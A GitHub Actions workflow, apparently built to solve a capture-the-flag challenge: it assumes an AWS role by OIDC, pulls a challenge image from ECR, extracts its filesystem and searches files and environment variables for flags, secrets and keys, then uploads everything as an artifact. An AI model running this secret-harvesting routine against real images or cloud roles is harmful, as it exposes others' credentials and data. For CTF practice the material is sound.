name: Fetch Challenge Files

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  fetch-challenge:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1

      - name: Login to ECR
        run: |
          aws ecr get-login-password --region ap-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com

      - name: Pull challenge Docker image
        run: |
          docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest

      - name: Create container and extract files
        run: |
          CONTAINER_ID=$(docker create 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest /bin/sh)
          mkdir -p exported_fs
          docker cp $CONTAINER_ID:/ ./exported_fs/
          docker rm $CONTAINER_ID

      - name: Explore extracted filesystem
        run: |
          echo "=== Exploring extracted files ==="
          find exported_fs -type f -name "*flag*" -o -name "*secret*" -o -name "*.txt" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20
          
          echo "=== Checking for interesting files ==="
          ls -la exported_fs/
          find exported_fs -name "not-flag-yet" 2>/dev/null && echo "Found 'not-flag-yet' file!"
          
          echo "=== Checking common directories ==="
          ls -la exported_fs/etc/ 2>/dev/null || echo "No /etc directory"
          ls -la exported_fs/root/ 2>/dev/null || echo "No /root directory" 
          ls -la exported_fs/home/ 2>/dev/null || echo "No /home directory"
          ls -la exported_fs/opt/ 2>/dev/null || echo "No /opt directory"
          ls -la exported_fs/tmp/ 2>/dev/null || echo "No /tmp directory"

      - name: Check file contents
        run: |
          echo "=== Checking file contents ==="
          if [ -f "exported_fs/not-flag-yet" ]; then
            echo "Found 'not-flag-yet' file. Contents:"
            cat exported_fs/not-flag-yet
          fi
          
          for file in $(find exported_fs -name "*.txt" -type f 2>/dev/null); do
            echo "=== Contents of $file ==="
            cat "$file" || echo "Could not read $file"
          done

      - name: Check environment variables from image
        run: |
          echo "=== Checking image environment ==="
          docker run --rm --entrypoint /bin/sh 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest -c "env" | grep -i -E "(flag|secret|key)" || echo "No flag-related environment variables"

      - name: Upload extracted files as artifact
        uses: actions/upload-artifact@v4
        with:
          name: challenge-files
          path: exported_fs/
          retention-days: 1
